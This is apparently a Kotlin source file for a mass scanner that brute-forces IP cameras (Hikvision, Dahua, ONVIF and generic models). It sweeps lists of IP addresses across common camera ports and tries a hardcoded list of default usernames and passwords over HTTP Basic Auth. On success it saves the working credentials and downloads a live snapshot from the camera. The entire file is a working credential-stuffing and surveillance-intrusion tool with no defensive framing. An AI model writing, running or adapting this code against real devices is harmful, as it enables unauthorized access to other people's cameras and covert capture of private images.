package com.dahua.checker

import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import java.util.Base64
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import java.util.concurrent.atomic.AtomicInteger

data class HttpScanResult(
    val ip: String,
    val port: Int,
    val login: String,
    val password: String,
    val brand: String,
    val title: String,
    val snapshot: ByteArray?,
    val timestampMs: Long = System.currentTimeMillis()
)

class HttpScanner {

    companion object {
        const val TIMEOUT_CONNECT = 2000
        const val TIMEOUT_READ = 3000
        const val MAX_CONCURRENT = 100

        val HTTP_PORTS = listOf(80, 81, 8080, 8899, 554, 8000, 8001, 85, 8888)

        val CREDENTIALS = listOf(
            "admin" to "admin",
            "admin" to "12345",
            "admin" to "123456",
            "admin" to "",
            "admin" to "admin123",
            "admin" to "password",
            "admin" to "1234",
            "admin" to "1111",
            "admin" to "111111",
            "admin" to "000000",
            "admin" to "888888",
            "admin" to "666666",
            "admin" to "admin888",
            "root" to "root",
            "root" to "admin",
            "root" to "123456",
            "root" to "",
            "guest" to "guest",
            "user" to "user",
            "default" to "tluafed"
        )

        // Пути для определения бренда и проверки аутентификации
        val PROBE_PATHS = listOf(
            ProbeInfo("/ISAPI/System/deviceInfo", "hikvision", "Hikvision"),
            ProbeInfo("/cgi-bin/magicBox.cgi?action=getDeviceType", "dahua_http", "Dahua"),
            ProbeInfo("/cgi-bin/snapshot.cgi?channel=1", "dahua_snap", "Dahua"),
            ProbeInfo("/onvif/device_service", "onvif", "ONVIF"),
            ProbeInfo("/cgi-bin/hi3510/snap.cgi?&-getstream&-chn=1", "generic", "IP Camera"),
            ProbeInfo("/snap.jpg", "generic_snap", "IP Camera"),
            ProbeInfo("/capture/webCapture.jpg?channel=1", "generic_snap2", "IP Camera"),
            ProbeInfo("/webcapture.jpg?command=snap&channel=1", "generic_snap3", "IP Camera"),
            ProbeInfo("/shot.jpg", "generic_snap4", "IP Camera"),
            ProbeInfo("/cgi-bin/snapshot.cgi", "generic_snap5", "IP Camera")
        )
    }

    data class ProbeInfo(val path: String, val type: String, val brand: String)

    @Volatile
    var cancelled = false

    private val semaphore = Semaphore(MAX_CONCURRENT)
    private val checkedCount = AtomicInteger(0)
    private val successCount = AtomicInteger(0)

    suspend fun scan(
        ips: List<String>,
        ports: List<Int> = HTTP_PORTS,
        onResult: suspend (HttpScanResult) -> Unit,
        onProgress: suspend (ScanProgress) -> Unit
    ) {
        cancelled = false
        checkedCount.set(0)
        successCount.set(0)
        val total = ips.size
        val startTime = System.currentTimeMillis()

        val progressJob = CoroutineScope(Dispatchers.Default).launch {
            while (isActive && !cancelled && checkedCount.get() < total) {
                delay(300)
                val elapsed = System.currentTimeMillis() - startTime
                onProgress(ScanProgress(total, checkedCount.get(), successCount.get(), 0, elapsed))
            }
        }

        coroutineScope {
            ips.map { ip ->
                async(Dispatchers.IO) {
                    if (cancelled) {
                        checkedCount.incrementAndGet()
                        return@async
                    }
                    semaphore.withPermit {
                        if (cancelled) {
                            checkedCount.incrementAndGet()
                            return@withPermit
                        }
                        try {
                            scanHost(ip, ports, onResult)
                        } catch (_: Exception) {}
                        checkedCount.incrementAndGet()
                    }
                }
            }.awaitAll()
        }

        progressJob.cancel()
        val elapsed = System.currentTimeMillis() - startTime
        onProgress(
            ScanProgress(
                total, checkedCount.get(), successCount.get(), 0, elapsed,
                finished = !cancelled, cancelled = cancelled
            )
        )
    }

    private suspend fun scanHost(
        ip: String,
        ports: List<Int>,
        onResult: suspend (HttpScanResult) -> Unit
    ) {
        for (port in ports) {
            if (cancelled) return
            // Быстрая проверка порта
            try {
                Socket().use { s ->
                    s.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
                }
            } catch (_: Exception) {
                continue
            }

            // Попробовать каждый probe path
            for (probe in PROBE_PATHS) {
                if (cancelled) return
                for ((login, password) in CREDENTIALS) {
                    if (cancelled) return
                    try {
                        val result = tryHttpAuth(ip, port, probe, login, password)
                        if (result != null) {
                            successCount.incrementAndGet()
                            onResult(result)
                            return // Нашли — дальше не проверяем этот хост
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun tryHttpAuth(
        ip: String,
        port: Int,
        probe: ProbeInfo,
        login: String,
        password: String
    ): HttpScanResult? {
        val url = URL("http://$ip:$port${probe.path}")
        val conn = url.openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout = TIMEOUT_READ
        conn.requestMethod = "GET"
        conn.instanceFollowRedirects = false

        // Basic Auth
        val auth = Base64.getEncoder().encodeToString("$login:$password".toByteArray())
        conn.setRequestProperty("Authorization", "Basic $auth")
        conn.setRequestProperty("User-Agent", "Mozilla/5.0")

        try {
            val code = conn.responseCode

            if (code == 401 || code == 403) {
                conn.disconnect()
                return null
            }

            if (code == 200) {
                val contentType = conn.contentType ?: ""
                var snapshot: ByteArray? = null
                var title = probe.brand

                if (contentType.contains("image", ignoreCase = true) ||
                    probe.type.contains("snap")
                ) {
                    // Это снапшот
                    snapshot = readBody(conn, maxSize = 512 * 1024)
                    if (snapshot != null && snapshot.size < 100) snapshot = null
                } else {
                    // Текстовый ответ — попробовать извлечь модель
                    val body = readBody(conn, maxSize = 8192)
                    if (body != null) {
                        val bodyStr = String(body, Charsets.UTF_8)
                        title = extractTitle(bodyStr, probe) ?: probe.brand
                    }

                    // Попробовать получить снапшот отдельно
                    if (snapshot == null) {
                        snapshot = tryGetSnapshot(ip, port, login, password)
                    }
                }

                conn.disconnect()
                return HttpScanResult(ip, port, login, password, probe.brand, title, snapshot)
            }

            conn.disconnect()
        } catch (_: Exception) {
            try { conn.disconnect() } catch (_: Exception) {}
        }
        return null
    }

    private fun tryGetSnapshot(ip: String, port: Int, login: String, password: String): ByteArray? {
        val snapPaths = listOf(
            "/cgi-bin/snapshot.cgi?channel=1",
            "/ISAPI/Streaming/channels/101/picture",
            "/snap.jpg",
            "/capture/webCapture.jpg?channel=1",
            "/shot.jpg",
            "/webcapture.jpg?command=snap&channel=1",
            "/cgi-bin/hi3510/snap.cgi?&-getstream&-chn=1"
        )

        for (path in snapPaths) {
            try {
                val url = URL("http://$ip:$port$path")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout = TIMEOUT_READ
                conn.requestMethod = "GET"
                val auth = Base64.getEncoder().encodeToString("$login:$password".toByteArray())
                conn.setRequestProperty("Authorization", "Basic $auth")
                conn.setRequestProperty("User-Agent", "Mozilla/5.0")

                val code = conn.responseCode
                if (code == 200) {
                    val ct = conn.contentType ?: ""
                    if (ct.contains("image", ignoreCase = true) || ct.contains("jpeg", ignoreCase = true)) {
                        val data = readBody(conn, maxSize = 512 * 1024)
                        conn.disconnect()
                        if (data != null && data.size > 100) return data
                    }
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    private fun extractTitle(body: String, probe: ProbeInfo): String? {
        return when {
            probe.type == "hikvision" -> {
                val m = Regex("<deviceName>(.*?)</deviceName>").find(body)
                m?.groupValues?.get(1) ?: "Hikvision"
            }
            probe.type == "dahua_http" -> {
                body.trim().takeIf { it.isNotEmpty() && it.length < 100 } ?: "Dahua"
            }
            else -> null
        }
    }

    private fun readBody(conn: HttpURLConnection, maxSize: Int): ByteArray? {
        return try {
            val input = conn.inputStream
            val buf = ByteArrayOutputStream()
            val tmp = ByteArray(4096)
            var total = 0
            while (total < maxSize) {
                val r = input.read(tmp)
                if (r == -1) break
                buf.write(tmp, 0, r)
                total += r
            }
            input.close()
            val result = buf.toByteArray()
            if (result.isEmpty()) null else result
        } catch (_: Exception) {
            null
        }
    }
}
